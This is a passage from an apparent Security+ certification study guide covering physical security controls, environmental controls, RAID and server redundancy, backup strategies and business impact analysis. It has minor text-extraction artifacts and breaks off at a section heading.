Key management is an important concept to consider when using hardware locks. Proper key management ensures that only authorized personnel can access the physical keys. This might be done by locking keys within a safe or locking cabinet.
Securing Mobile Computers with Cable Locks
Cable locks are a great theft deterrent for mobile computers, and even many desktop computers at work. Computer cable locks work similar to how a
 bicycle cable lock works. However, instead of securing a bicycle to a bike rack or post, a computer cable lock secures a computer to a piece of furniture. The user wraps the cable around a desk, table, or something heavy, and then plugs it into an opening in the laptop specifically created for this purpose. Most cable locks have a four-digit combo. If you (or anyone) remove the cable
lock without the combo, it will likely destroy the laptop.
Another common use of cable locks is for computers in unsupervised
labs. example, you can secure laptop or desktop computers with cable locks in a training lab. This allows you to leave the room open so that students can use the equipment, but the cable locks prevent thieves from stealing the equipment.
Securing Servers with Locking Cabinets
Larger companies often have large server rooms with advanced security to restrict access. Additionally, within the server room, administrators use locking cabinets or enclosures to secure equipment mounted within the bays. An equipment bay is about the size of a large refrigerator and can hold servers, routers, and other IT equipment. These bays have doors in the back and many have doors in the front, too. Administrators lock these doors to prevent unauthorized personnel from accessing theequipment.
Offices often have file cabinets that lock, too, so i t ’s important to pay attention to the context when referring to locking cabinets. example, if you want to secure equipment within a server room, a locking cabinet is one of many physical security controls you can use. If you want to secure unattended smartphones in an office space, you can also use a locking cabinet, but this is an office file cabinet that locks.
Securing Small Devices with a Safe
Locking file cabinets or safes used in many offices help prevent the theft of smaller devices. example, you can store smaller devices such as external USB drives or USB flash drives in an
 office safe or locking cabinet when they aren’t in use. Depending on the size of the office safe and office cabinet, you might also be able to secure laptops within them.
Asset Management
Asset management is the process of tracking valuable assets throughout their life cycles. example, organizations commonly implement processes to track hardware such as servers, desktop computers, laptop computers, routers, and switches. An effective asset management system can help reduce several vulnerabilities:
Architecture and design weaknesses. Asset management helps reduce architecture and design weaknesses by ensuring that purchases go through an approval process. The approval process does more than just compare costs. It also evaluates the purchase to ensure it fits in the overall network architecture. Unapproved assets often weaken security by adding in additional resources that aren’t managed.
System sprawl and undocumented assets. System sprawl occurs when an organization has more systems than it needs, and systems it owns are underutilized. Asset management begins before the hardware is purchased and helps prevent system sprawl by evaluating the purchase. Additionally, after the purchase is completed, asset management processes ensure hardware is added into the asset management tracking system. This ensures that the assets are managed and tracked from cradle to grave.
Many organizations use automated methods for inventory control. example, radio- frequency identification (RFID) methods can track the movement of devices. These are the same types of devices used in stores to prevent shoplifting. If someone exits without paying, the RFID device transmits when the shoplifter gets close to the exit door and sounds an alarm. Organizations won’t necessarily have an alarm, but they can track the movement ofdevices.
Mobile devices are easy to lose track of, so organizations often use asset- tracking methods to reduce losses. example, when a user is issued a mobile device, asset-tracking methods record it. Similarly, if the user leaves
the company, asset-tracking methods ensure the user returns the device. Implementing Environmental Controls
Although environmental controls might not seem security related, they directly contribute to the availability of systems. This includes ensuring temperature and humidity controls are operating properly, fire suppression systems are in place, and proper procedures are used when running cables.
Heating, Ventilation, and Air Conditioning
Heating, ventilation, and air conditioning (HVAC) systems are important physical security controls that enhance the availability of systems. Quite simply, computers and other electronic equipment can’t handle drastic changes in temperatures, especially hot temperatures. If systems overheat, the chips can actually burn themselves out.
The cooling capacity of HVAC systems is measured as tonnage. This has nothing to do with weight, but instead refers to cooling capacity. One ton of cooling equals 12,000 British thermal units per hour (Btu/hour), and typical home HVAC systems are three-ton units. Higher-tonnage HVAC systems can cool larger areas or areas with equipment generating more heat.
The amount of air conditioning needed to cool a massive data center is much greater than
you need to cool your home, primarily because of all the heat generated by the equipment. If your home air conditioner fails in the middle of summer, you might be a little uncomfortable for a while, but if the data center HVAC system fails, it can result in loss of availability and a substantial loss of money.
I worked in several environments where we had a policy of shutting down all electronics when the room temperature reached a certain threshold. When we didn’t follow the policy, the systems often developed problems due to the heat and ended up out of commission for a lot longer than the AC.
Most servers aren’t in cases like a typical desktop computer. Instead, they are housed in rack-mountable cases. These rack-mountable servers are installed in equipment cabinets (also called racks or bays) about the size of tall refrigerators. A large data center will have multiple cabinets lined up beside each other in multiple rows.
These cabinets usually have locking doors in the front and rear for physical security. The doors are perforated with cold air coming in the front, passing over and through the servers to keep them cool, and warmer air exiting out the rear. Additionally, a server room has raised flooring with air conditioning pumping through the space under the raised floor.
Hot and Cold Aisles
Hot and cold aisles help regulate the cooling in data centers with multiple rows of cabinets. The back of all the cabinets in one row faces the back of all the cabinets in an adjacent row. Because the hot air exits out the back of the cabinet, the aisle with the backs facing each other is the hot aisle.
Similarly, the front of the cabinets in one row is facing the front of the cabinets in the adjacent row. Cool air is pumped through the floor to this cool aisle using perforated floor tiles in the raised flooring. This is the cold aisle. In some designs, cool air is also pumped through the base of the cabinets. This depends on the design of the cabinets and the needs of the equipment. Consider what happens if all the cabinets had their front facing the same way
without a hot/cold aisle design. The hot air pumping out the back of one row of cabinets would be sent to the front of the cabinets behind them. The front
row would have very cold air coming in the front, but other rows would have warmer air coming in the front.
Of course, an HVAC also includes a thermostat as a temperature control and additional humidity controls. The thermostat ensures that the air temperature is controlled and maintained. Similarly, humidity controls ensure that the humidity is controlled. High humidity can cause condensation on the equipment, which causes water damage. Low humidity allows a higher incidence of electrostatic discharge (ESD).
HVAC and Fire
HVAC systems are often integrated with fire alarm systems to help prevent a fire from spreading. One of the core elements of a fire is oxygen. If the HVAC system continues to operate normally while a fire is active, it continues to pump oxygen, which feeds the fire. When the HVAC system is integrated
 with the fire alarm system, it controls the airflow to help prevent the rapid spread of the fire. Many current HVAC systems have dampers that can control airflow to specific areas of a building. Other HVAC systems automatically turn off when fire suppression systems detect a fire.
Fire Suppression
Yo u can fight fires with individual fire extinguishers, with fixed systems, or both. Most organizations included fixed systems to control fires and place portable fire extinguishers in different areas around the organization. A fixed system can detect a fire and automatically activate to extinguish the fire. Individuals use portable fire extinguishers to extinguish or suppress small fires.
The different components of a fire are heat, oxygen, fuel, and a chain reaction creating the fire. Fire suppression methods attempt to remove or disrupt one of these elements to extinguish a fire. You can extinguish a fire using one of these methods:
Remove the heat. Fire extinguishers commonly use chemical agents or water to remove the heat. However, water should never be used on an electrical fire.
Remove the oxygen. Many methods use a gas, such as carbon dioxide (CO2) to displace the oxygen. This is a common method of fighting
electrical fires because CO2 and similar gasses are harmless to electrical
equipment.
Remove the fuel. Fire-suppression methods don’t typically fight a fire this way, but of course, the fire will go out once all the material is burned.
Disrupt the chain reaction. Some chemicals can disrupt the chain reaction of fires to stopthem.
When implementing any fire suppression system, it’s important to
 consider the safety of personnel. example, if a fire suppression system uses a gas such as carbon dioxide (CO2) to displace the oxygen, it’s important to ensure that
personnel can get out before the oxygen is displaced.
Similarly, consider an exit door secured with a proximity card. Normally, employees open the door with the proximity card and the system records their exit. What happens if a fire starts and power to the building is lost? The proximity card reader won’t work, and if the door can’t open, employees will be trapped. It’s important to ensure that an alternative allows personnel to exit even if the proximity card reader loses power. Of course, this might introduce a vulnerability to consider. You don’t want an attacker to access a secure data center just by removing power to the proximity reader.
Environmental Monitoring
Environmental monitoring includes temperature and humidity controls. From a very basic perspective, an HVAC system monitors the current temperature and humidity and makes adjustments as necessary to keep the temperature and humidity constant.
Large-scale data centers often have sophisticated logging capabilities for environmental monitoring. The HVAC system still attempts to keep the temperature and humidity constant. However, the logs record the actual temperature and humidity at different times during the day. This allows administrators to review the performance of the HVAC system, to see if it is able to keep up with the demands within the datacenter.
Shielding
Shielding helps prevent electromagnetic interference (EMI) and radio frequency interference (RFI) from interfering with normal signal transmissions. It also protects against unwanted emissions and helps prevent an attacker from capturing network traffic.
Although you might see EMI and RFI in the same category as EMI/RFI, they are different. EMI comes from different types of motors, power lines, and even fluorescent lights. RFI comes from radio frequency (RF) sources such as AM or FM transmitters. However, shielding used to block interference from both EMI and RFI sources is often referred to as simply EMI shielding. Attackers often use different types of eavesdropping methods to capture network traffic. If the data is emanating outside of the wire or outside of an enclosure, attackers may be able to capture and read the data. EMI shielding fulfills the dual purpose of keeping interference out and preventing attackers
from capturing network traffic.
Protected Cabling
Twisted-pair cable, such as CAT5e and CAT6 cable, comes in both shielded twisted-pair (STP) and unshielded twisted-pair (UTP) versions. The shielding helps prevent an attacker from capturing network traffic and helps block interference from corrupting the data.
When data travels along a copper wire (such as twisted-pair), it creates an induction field around the wire. If you have the right tools, you can simply place the tool around the wire and capture the signal. The shielding in STP cable blocks this. Fiber-optic cable is not susceptible to this type of attack. Signals travel along a fiber-optic cable as light pulses, and they do not create
an induction field.
Protected Distribution of Cabling
Physical security includes planning where you route cables and how you route them. Skilled network administrators can cut a twisted-pair cable, attach an RJ-45 connector to each end, and connect them back together with an adapter in less than 5 minutes. Experienced fiber-optic cable technicians can do the same thing with a fiber-optic cable within 10 minutes.
If an attacker did this, he could connect the cut cable with a hub, and then capture all the traffic going through the hub with a protocol analyzer. This represents a significant risk.
One method of reducing this risk is to run cables through cable troughs or wiring ducts. A cable trough is a long metal container, typically about 4 inches wide by 4 inches high. If you run data cables through the cable through, they aren’t as accessible to potential attackers. In contrast, many organizations simply run the cable through a false ceiling or a raised floor.
In addition to considering physical security, it’s important to keep the cables away from EMI sources. example, if technicians run cables over or through fluorescent lighting fixtures, the EMI from the lights can disrupt the signals on the cables. The result is intermittent connectivity for users. Faraday Cage
A Faraday cage is typically a room that prevents signals from emanating beyond the room. It includes electrical features that cause RF signals that reach the boundary of the room to be reflected back, preventing signal emanation outside the Faraday cage. A Faraday cage can also be a small enclosure.
In addition to preventing signals from emanating outside the room, a Faraday cage also provides shielding to prevent outside interference such as EMI and RFI from entering the room. At a very basic level, some elevators act as a Faraday cage (though I seriously doubt the designers were striving to do so). You might have stepped into an elevator and found that your cell phone stopped receiving and transmitting signals. The metal shielding around the elevator prevents signals from emanating out or signals such as the cell phone tower signal from entering
the elevator.
On a smaller scale, electrical devices such as computers include shielding
to prevent signals from emanating out and block interference from getting in.
 Adding Redundancy and Fault Tolerance
One of the constants with computers, subsystems, and networks is that they will fail. It’s one of the few things you can count on. It’s not a matter of if they will fail, but when. However, by adding redundancy into your systems and networks, you can increase the reliability of your systems even when they fail. By increasing reliability, you increase one of the core security goals: availability. networks and provides fault tolerance. If a critical component has a fault, the duplication provided by the redundancy allows the service to continue as if a fault never occurred. In other words, a system with fault tolerance can suffer a fault, but it can tolerate it and continue to operate. Organizations often add redundancies to eliminate single points of failure.
You can add redundancies at multiple levels:
Disk redundancies usingRAID
Server redundancies by adding failover clusters Power redundancies by adding generators or an UPS Site redundancies by adding hot, cold, or warm sites
Single Point of Failure
A single point of failure is a component within a system that can cause the entire system to fail if the component fails. When designing redundancies, an organization will examine different
components to determine if they are a single point of failure. If so, they take steps to provide a redundancy or fault-tolerance capability. The goal is to increase reliability and availability of the systems.
Some examples of single points of failure include:
Disk. If a server uses a single drive, the system will crash if the single drive fails. Redundant array of inexpensive disks (RAID) provides fault tolerance for hard drives and is a relatively inexpensive method of adding fault tolerance to a system.
Server. If a server provides a critical service and its failure halts the service, it is a single point of failure. Failover clusters (discussed later in this chapter) provide fault tolerance for critical servers.
Power. If an organization only has one source of power for critical systems, the power is a single point of failure. However, elements such as uninterruptible power supplies (UPSs) and power generators provide fault tolerance for power outages.
Although IT personnel recognize the risks with single points of failure, they often overlook them until a disaster occurs. However, tools such as business continuity plans (covered later in this chapter) help an organization identify critical services and address single points of failure.  Disk Redundancies
Any system has four primary resources: processor, memory, disk, and the network interface. Of these, the disk is the slowest and most susceptible to failure. Because of this, administrators often upgrade disk subsystems to improve their performance and redundancy.
Redundant array of inexpensive disks (RAID) subsystems provide fault tolerance for disks and increase the system availability. Even if a disk fails, most RAID subsystems can tolerate the failure and the system will
continue to operate. RAID systems are becoming much more affordable as the price of drives steadily falls and disk capacity steadily increases. While i t’s expected that you are familiar with RAID subsystems, the following sections provide a short summary to remind you of the important details.
RAID-0
RAID-0 (striping) is somewhat of a misnomer because it doesn’t provide any redundancy or fault tolerance. It includes two or more physical disks. Files stored on a RAID-0 array are spread across each of the disks.
The benefit of a RAID-0 is increased read and write performance. Because a file is spread across multiple physical disks, the different parts of the file can be read from or written to each of the disks at the same time. If you have three 500 GB drives used in a RAID-0, you have 1,500 GB (1.5 TB) of storage space.
RAID-1
RAID-1 (mirroring) uses two disks. Data written to one disk is also written to the other disk. If one of the disks fails, the other disk still has all the data, so the system can continue to operate without any data loss. With this in mind, if you mirror all the drives in a system, you can actually lose half of the drives and continue to operate.
You can add an additional disk controller to a RAID-1 configuration to remove the disk controller as a single point of failure. In other words, each of the disks also has its own disk controller. Adding a second disk controller to a mirror is called disk duplexing.
If you have two 500 GB drives used in a RAID-1, you have 500 GB of storage space. The other 500 GB of storage space is dedicated to the fault- tolerant, mirrored volume.
RAID-2, RAID 3, and RAID-4 are rarely used.
RAID-5 and RAID-6
A RAID-5 is three or more disks that are striped together similar to RAID-0. However, the equivalent of one drive includes parity information. This parity information is striped across each of the drives in a RAID-5 and is used for fault tolerance. If one of the drives fails, the system can read the information on the remaining drives and determine what the actual data should be. If two of the drives fail in a RAID-5, the data is lost.
RAID-6 is an extension of RAID-5, and it includes an additional parity block. A huge benefit is that the RAID-6 disk subsystem will continue to operate even if two disk drives fail. RAID-6 requires a minimum of four disks.
RAID-10
A RAID-10 configuration combines the features of mirroring (RAID-1) andstriping(RAID-0).RAID-10issometimescalledRAID1+0.Avariationis
RAID-01 or RAID 0+1 that also combines the features of mirroring and striping but implements the drives a little differently.
The minimum number of drives in a RAID-10 is four. When adding more drives, you add two (or multiples of two such as four, six, and so on). If you have four 500 GB drives used in a RAID-10, you have 1 TB of usable storage.
 Server Redundancy and High Availability
High availability refers to a system or service that needs to remain operational with almost zero downtime. Utilizing different redundancy and fault-tolerance methods, it’s possible to achieve 99.999 percent uptime, commonly called five nines. This equates to less than 6 minutes of downtime a year: 60 minutes × 24 hours × 365 days ×.00001 = 5.256 minutes. Failover clusters are a key component used to achieve fivenines.
Although five nines is achievable, it’s expensive. However, if the potential cost of an outage is high, the high cost of the redundant technologies is justified. example, some web sites
generate a significant amount of revenue, and every minute a web site is unavailable represents lost money. High-capacity failover clusters ensure the service is always available even if a server fails.
Distributive allocation is another option to provide both high availability and scalability, though it is typically used primarily in scientific applications. In a distributed application model, multiple computers (often called nodes) are configured to work together to solve complex problems. These computers are configured within a local network. A central processor divides the complex problem into smaller tasks. It then coordinates tasking of the individual nodes and collecting the results. If any single nodes fail, the central processor doesn’t task it anymore, but overall processing continues, providing high availability. This also provides high scalability because it is relatively easy to add additional nodes and task them when they come online.
Failover Clusters for High Availability
The primary purpose of a failover cluster is to provide high availability for a service offered by a server. Failover clusters use two or more servers in a cluster configuration, and the servers are referred to as nodes. At least one server or node is active and at least one is inactive. If an active node fails, the inactive node can take over the load without interruption to clients.  Consider Figure 9.1, which shows a two-node active-passive failover cluster. Both nodes are
individual
servers, and they both have access to external data storage used by the active server. Additionally, the two nodes have a monitoring connection to each other used to check the health or heartbeat of each other.
Figure 9.1: Failover cluster
Imagine that Node 1 is the active node. When any of the clients connect, the cluster software (installed on both nodes) ensures that the clients connect to the active node. If Node 1 fails, Node 2 senses the failure through the heartbeat connection and configures itself as the active node. Because both nodes have access to the shared storage, there is no loss of data for the client. Clients may notice a momentary hiccup or pause, but the service continues.
You might notice that the shared storage in Figure 9.1 represents a single point of failure. It’s not uncommon for this to be a robust hardware RAID-10. This ensures that even if a hard drive in the shared storage fails, the service will continue. Additionally, if both nodes are plugged into the same power grid, the power represents a single point of failure. They can each be protected with a separate UPS, and use a separate power grid.
It’s also possible to configure the cluster as an active-active cluster. Instead of one server being passive, the cluster balances the load between both servers.
Cluster configurations can include many more nodes than just two. However, nodes need to have close to identical hardware and are often quite expensive, but if a company truly needs to achieve 99.999 percent uptime, it’s worth theexpense.
Load Balancers for High Availability
A load balancer can optimize and distribute data loads across multiple computers or multiple networks. example, if an organization hosts a popular web site, it can use multiple servers hosting the same web site in a web farm. Load-balancing software distributes traffic equally among all the servers in the web farm, typically located in a DMZ.
The term load balancer makes it sound like it’s a piece of hardware, but a load balancer can be hardware or software. A hardware-based load balancer accepts traffic and directs it to servers based on factors such as processor utilization and the number of current connections to the server. A software- based load balancer uses software running on each of the servers in the load- balanced cluster to balance the load.
Load balancing primarily provides scalability, but it also contributes to high availability. Scalability refers to the ability of a service to serve more clients without any decrease in performance. Availability ensures that systems are up and operational when needed. By spreading the load among multiple systems, it ensures that individual systems are not overloaded, increasing overall availability.
Consider a web server that can serve 100 clients per minute, but if more than 100 clients connect at a time, performance degrades. You need to either scale up or scale out to serve more clients. You scale the server up by adding additional resources, such as processors and memory, and you scale out by adding additional servers in a load balancer.  Figure 9.2 shows an example of a load balancer with multiple web servers configured in a web farm. Each web server includes the same web application. A load balancer uses a scheduling technique to determine where to send new requests. Some load balancers simply send new requests to the servers in a round-robin fashion. The load balancer sends the first request to Server 1, the second request to Server 2, and so on. Other load balancers automatically detect the load on
individual servers and send new clients to the least used server.
Figure 9.2: Load balancing
Some load balancers use source address affinity to direct the requests. Source affinity sends requests to the same server based on the requestor’s IP address. example, imagine that Homer sends a request to retrieve a web page. The load balancer records his IP address and sends his request to Server 3. When he sends another request, the load balancer identifies his IP address and sends his request to Server 3 again. Source affinity effectively sticks users to a specific server for the duration oftheir sessions.
A software-based load balancer uses a virtual IP. example, imagine the IP address of the web site is 72.52.206.134. This IP address isn’t assigned to a specific server. Instead, clients send requests to this IP address and the load- balancing software redirects the request to one of the three servers in the web farm using their private IP addresses. In this scenario, the actual IP address is referred to as a virtual IP.
An added benefit of many load balancers is that they can detect when a
server fails. If a server stops responding, the load-balancing software no longer sends clients to this server. This contributes to overall high availability for the load balancer.
 Clustering Versus Load Balancing
It’s worth mentioning that CompTIA has grouped both clustering and load balancing into the same category of load balancing in the objectives. Many IT professionals do the same thing, though technically they are different concepts. In general, failover clusters are commonly used for applications such as database applications. Load balancers are often used for services, such as web servers in a web farm.
Power Redundancies
Power is a critical utility to consider when reviewing redundancies. For mission-critical systems, you can use uninterruptible power supplies and generators to provide both fault tolerance and high availability. An UPS provides fault tolerance for power and can protect against power fluctuations. It provides short-term power. Generators provide long-term power in extended outages.
Protecting Data with Backups
Backups are copies of data created to ensure that if the original data is lost or corrupted, it can be restored. Maybe I should restate that. Backups are copies of data created to ensure that when the original data is lost or corrupted, it can be restored. The truth is, if you work with computers long enough, you will lose data. The difference between a major catastrophe and a minor inconvenience is the existence of a usable backup.
It’s important to realize that redundancy and backups are not the same thing. Protecting data with a RAID-1 or RAID-10 does not negate the need for backups. If a fire destroys a server, it also destroys the data on the RAID. Without a backup, all of the data is gone. Forever.
Comparing Backup Types
Backup utilities support several different types of backups. Even though third-party backup programs can be quite sophisticated in what they do and how they do it, you should have a solid understanding of the basics.
The most common media used for backups is tape. Tapes store more data and are cheaper than other media, though some organizations use hard drives for backups. However, the type of media doesn’t affect the backup type.
The following backup types are commonly used:
Full backup. A full (or normal backup) backs up all the selected data.
Differential backup. This backs up all the data that has changed or is 533

different since the last full backup.
Incremental backup. This backs up all the data that has changed since the last full or incremental backup.
Snaphots. A snapshot backup captures the data at a point in time. It is sometimes referred to as an image backup.
Full Backups
A full backup backs up all data specified in the backup. example, you could have several folders on the D: drive. If you specify these folders in the backup program, the backup program backs up all the data in these folders.
Although it’s possible to do a full backup on a daily basis, it’s rare to do so in most production environments. This is because of two limiting factors:
Time. A full backup can take several hours to complete and can interfere with operations. However, administrators don’t always have unlimited time to do backups and other system maintenance. example, if a system is online 24/7, administrators might need to limit the amount of time for full backups to early Sunday morning to minimize the impact on users.
Money. Backups need to be stored on some type of media, such as tape or hard drives. Performing full backups every day requires more media, and the cost can be prohibitive. Instead, organizations often combine full
backupswithdifferentialorincrementalbackups. However, every backup strategy must start with a full backup.
Restoring a Full Backup
A full backup is the easiest and quickest to restore. You only need to restore the single full backup and you’re done. If you store backups on tapes, you only need to restore a single tape. However, most organizations need to balance time and money and use either a full/differential or a full/incremental backup strategy.
Differential Backups
A differential backup strategy starts with a full backup. After the full backup, differential backups back up data that has changed or is different since the last full backup.
example, a full/differential strategy could start with a full backup on Sunday night. On Monday night, a differential backup would back up all files that changed since the last full backup on Sunday. On Tuesday night, the differential backup would again back up all the files that changed since the last full backup. This repeats until Sunday, when another full backup starts the process again. As the week progresses, the differential backup steadily grows in size.
Order of Restoration for a Full/Differential Backup Set
Assume for a moment that each of the backups was stored on different tapes. If the system crashed on Wednesday morning, how many tapes would you need to recover the data?
The answer is two. You would first recover the full backup from Sunday. Because the differential backup on Tuesday night includes all the files that changed after the last full backup, you would restore that tape to restore all the changes up to Tuesday night.
Incremental Backups
An incremental backup strategy also starts with a full backup. After the full backup, incremental backups then back up data that has changed since the last backup. This includes either the last full backup, or the last incremental backup.
example, a full/incremental strategy could start with a full backup on Sunday night. On Monday night, an incremental backup would back up all the files that changed since the last full backup. On Tuesday night, the incremental backup would back up all the files that changed since the incremental backup on Monday night. Similarly, the Wednesday night backup would back up all files that changed since the last incremental backup on Tuesday night. This repeats until Sunday when another full backup starts the process again. As the week progresses, the incremental backups stay about the same size.
Order of Restoration for a Full/Incremental Backup Set
Assume for a moment that each of the backups were stored on different tapes. If the system crashed on Thursday morning, how many tapes would you need to recover the data?
The answer is four. You would first need to recover the full backup from Sunday. Because the incremental backups would be backing up different data each day of the week, each of the incremental backups must be restored—and must be restored in chronological order.
Sometimes, people mistakenly think the last incremental backup would have all the relevant data. Although it might have some relevant data, it doesn’t have everything.
example, imagine you worked on a single project file each day of the week, and the system crashed on Thursday morning. In this scenario, the last incremental backup would hold the most recent copy of this file. However, what if you compiled a report every Monday but didn’t touch it again until the following Monday? Only the incremental backup from Monday would include the most recent copy. An incremental backup from Wednesday night or another day of the week wouldn’t include the report.
Choosing Full/Incremental or Full/Differential
A logical question is, “Why are there so many choices for backups?” The answer is that different organizations have different needs. example, imagine two organizations perform daily backups to minimize losses. They each do a full backup on Sunday, but are now trying to determine if they should use a full/ incremental or a full/differentialstrategy.
The first organization doesn’t have much time to perform maintenance throughout the week. In this case, the backup administrator needs to minimize the amount of time required to complete backups during the week. An incremental backup only backs up the data that has changed since the last backup. In other words, it includes changes only from a single day. In contrast, a differential backup includes all the changes since the last full
backup. Backing up the changes from a single day takes less time than backing up changes from multiple days, so a full/ incremental backup is the best choice.
In the second organization, recovery of failed systems is more important. If a failure requires restoring data, they want to minimize the amount of time needed to restore the data. A full/ differential is the best choice in this situation because it only requires the restoration of two backups, the full and the most recent differential backup. In contrast, a full/incremental can require the restoration of several different backups, depending on when the failure occurs.
Snapshot Backup
A snapshot backup captures the data at a moment in time. It is commonly used with virtual machines and sometimes referred to as a checkpoint. Chapter 1, “Mastering Security Basics,” discusses virtual machines (VMs) and administrators often take a snapshot of a VM before a risky operation such as an update. If the update causes problems, it’s relatively easy to revert the VM to the state it was in before the update.
Testing Backups
I’ve heard many horror stories in which personnel are regularly performing backups thinking all is well. Ultimately, something happens and they need to restore some data. Unfortunately, they discover that none of the backups hold valid data. People have been going through the motions, but something in the process is flawed.
The only way to validate a backup is to perform a test restore. Performing a test restore is nothing more than restoring the data from a backup and verifying its integrity. If you want to verify that you can restore the entire backup, you perform a full restore of the backup. If you want to verify that you can restore individual files, you perform a test restore of individual files. It’s common to restore data to a different location other than the original source location, but in such a way that you can validate the data.
As a simple example, an administrator can retrieve a random backup and attempt to restore it. There are two possible outcomes of this test, and both are good:
The test succeeds. Excellent! You know that the backup process works. You don’t necessarily know that every backup tape is valid, but at least you know that the process is sound and at least some of your backups work.
The test fails. Excellent! You know there’s a problem that you can fix before a crisis. If you discovered the problem after you actually lost data, it wouldn’t help you restore the data.
An additional benefit of performing regular test restores is that it allows administrators to become familiar with the process. The first time they do a restore shouldn’t be in the middle of a crisis with several high-level managers peering over their shoulders.
Protecting Backups
If data is important enough to be backed up, it’s important enough to protect. Backup media should be protected at the same level as the data that it holds. In other words, if proprietary data enjoys the highest level of protection within an organization, then backups of this data should also have the highest level ofprotection.
Protecting backups includes:
Storage. This includes using clear labeling to identify the data and
physical security protection to prevent others from easily accessing it while it’sstored.
Transfer. Data should be protected any time it is transferred from one location to another. This is especially true when transferring a copy of the backup to a separate geographicallocation.
Destruction. When the backups are no longer needed, they should be destroyed. This can be accomplished by degaussing the media, shredding or burning the media, or scrubbing the media by repeatedly writing varying patterns of 1s and 0s onto the media.
Backups and Geographic Considerations
Organizations typically create a backup policy to answer critical questions related to backups. The backup policy is a written document and will often identify issues such as what data to back up, how often to back up the data, how to test the backups, and how long to retain the backups.
Additionally, it’s important to address special geographic considerations, such as the following: Off-site backups. A copy of a backup should be stored in a separate geographic location. This protects against a disaster such as a fire or flood. Even if a disaster destroys the site, the organization will still have another copy of the critical data.
Distance. Many organizations have specific requirements related to the distance between the main site and the off-site location. In some scenarios, the goal is to have the off-site location relatively close so that backups can be easily retrieved. However, in other scenarios, the off- site location must be far away, such as 25 miles or further away.
Location selection. The location is often dependent on environmental issues. example, consider an organization located in California near the San Andreas fault. The off-site backup location should be far enough away that an earthquake at the primary location doesn’t affect the off- site location.
Legal implications. The legal implications related to backups depends on the data stored in the backups. example, if the backups include Personally Identifiable Information (PII) or Protected Health Information (PHI), the backups need to be protected according to governing laws.
Data sovereignty. Data sovereignty refers to the legal implications when data is stored off-site. If the backups are stored in a different country, they are subject to the laws of that country. This can be a concern if the backups are stored in a cloud location, and the cloud servers are in a different country. example, imagine that an organization is located in the United States. It routinely does backups and stores them with a cloud provider. The cloud provider has some servers in the United States, some in Canada, and some in Mexico. If the organization’s backups are stored in the other countries, it can be subject to additional laws and regulations.
Comparing Business Continuity
 Elements
Business continuity planning helps an organization predict and plan for potential outages of critical services or functions. The goal is to ensure that critical business operations continue and the organization can survive the outage. Organizations often create a business continuity plan (BCP). This plan includes disaster recovery elements that provide the steps used to return critical functions to operation after an outage.
Disasters and outages can come from many sources, including: Fires
Attacks
Power outages
Data loss from any cause
Hardware and software failures
Natural disasters, such as hurricanes, floods, tornadoes, and earthquakes
Addressing all of these possible sources takes a lot of time and effort. The goal is to predict the relevant disasters, their impact, and then develop recovery strategies to mitigate them. One of the first things an organization completes is a business impact analysis.
Business Impact Analysis Concepts
A business impact analysis (BIA) is an important part of a BCP. It helps an organization identify critical systems and components that are essential to the organization’s success. These critical systems support mission-essential functions. The BIA also helps identify vulnerable business processes. These are processes that support mission-essential functions.
example, imagine an organization has an online e-commerce business. Some basic mission-essential functions might include serving web pages, providing a shopping cart path, accepting purchases, sending email confirmations, and shipping purchases to customers. The shopping cart path alone is a business process and because it is essential to the mission of e- commerce sales, management will likely consider it a vulnerable business process to protect. The customer needs to be able to view products, select a product, enter customer information, enter credit card data, and complete the purchase. Some critical systems that support the web site are web servers and a back-end database application hosted on one or more database servers.
If critical systems and components fail and cannot be restored quickly, mission-essential functions cannot be completed. If this lasts too long, it’s very possible that the organization will not survive the disaster.
example, if a disaster such as a hurricane hit, which services must the organization restore to stay in business? Imagine a financial institution. It might decide that customers must have uninterrupted access to account data through an online site. If customers can’t access their funds online, they might lose faith with the company and leave in droves.
However, the company might decide to implement alternate business practices in other elements of the business. example, management might decide that accepting and processing loan applications is not important enough to continue during a disaster. Loan processing is still important to the company’s bottom line, but a delay will not seriously affect its ability to stay
in business. In this scenario, continuous online access is a mission-essential function, but processing loan applications during a disaster is not mission- essential.
The time to make these decisions is not during a crisis. Instead, the organization completes a BIA in advance. The BIA involves collecting information from throughout the organization and documenting the results. This documentation identifies core business or mission requirements. The BIA does not recommend solutions. However, it provides management with valuable information so that they can focus on critical business functions. It helps them address some of the following questions:
What are the critical systems and functions?
Are there any dependencies related to these critical systems and functions?
What is the maximum downtime limit of these critical systems and functions?
What scenarios are most likely to impact these critical systems and functions?
What is the potential loss from these scenarios?
example, imagine an organization earns an average of $5,000 an hour through online sales. In this scenario, management might consider online sales to be a mission-essential function and all systems that support online sales are critical systems. This includes web servers and back-end database servers. These servers depend on the network infrastructure connecting them, Internet access, and access to payment gateways for credit card charges.
After analysis, they might determine that the maximum allowable outage for online sales is five hours. Identifying the maximum downtime limit is extremely important. It drives decisions related to recovery objectives and helps an organization identify various contingency plans and policies.
Impact
The BIA evaluates various scenarios, such as fires, attacks, power outages, data loss, hardware and software failures, and natural disasters. Additionally, the BIA attempts to identify the impact from these scenarios.
When evaluating the impact, a BIA looks at multiple items. example, it might attempt to answer the following questions related to any of the scenarios: Will a disaster result in loss of life? Is there a way to minimize the risk to
personnel?
Will a disaster result in loss of property?
Will a disaster reduce safety for personnel or property?
What are the potential financial losses to the organization? What are the potential losses to the organization’sreputation?
example, a database server might host customer data, including credit card information. If an attacker was able to access this customer data, the cost to the organization might exceed millions of dollars.
You might remember the attack on retail giant Target during November and December 2013. Attackers accessed customer data on more than 110 million customers, resulting in significant losses for Target. Estimates of the total cost of the incident have ranged from $600 million to over $1 billion. This includes loss of sales—Target suffered a 46 percent drop in profits during the last quarter of 2013, compared with the previous year. Customers were afraid to use their credit cards at Target and simply stayed away. It also includes the cost to repair their image, the cost of purchasing credit monitoring for affected customers, fines from the payment-card industry, and an untold number of lawsuits. Target reportedly has $100 million in cyber insurance that helped them pay claims related to the data breach.  Privacy Impact and Threshold Assessments
Two tools that organizations can use when completing a BIA are a privacy threshold assessment and a privacy impact assessment. National Institute of Standards and Technology (NIST) Special Publication (SP) 800- 122, “Guide to Protecting the Confidentiality of Personally Identifiable Information (PII),” covers these in more depth, but refers to a privacy threshold assessment as a privacy threshold analysis.
The primary purpose of the privacy threshold assessment is to help the organization identify PII within a system. Typically, the threshold assessment is completed by the system owner or data owner by answering a simple questionnaire.
If the system holds PII, then the next step is to conduct a privacy impact assessment. The impact assessment attempts to identify potential risks related to the PII by reviewing how the information is handled. The goal is to ensure that the system is complying with applicable laws, regulations, and guidelines. The impact assessment provides a proactive method of addressing potential risks related to PII throughout the life cycle of a computing system.
Recovery Time Objective
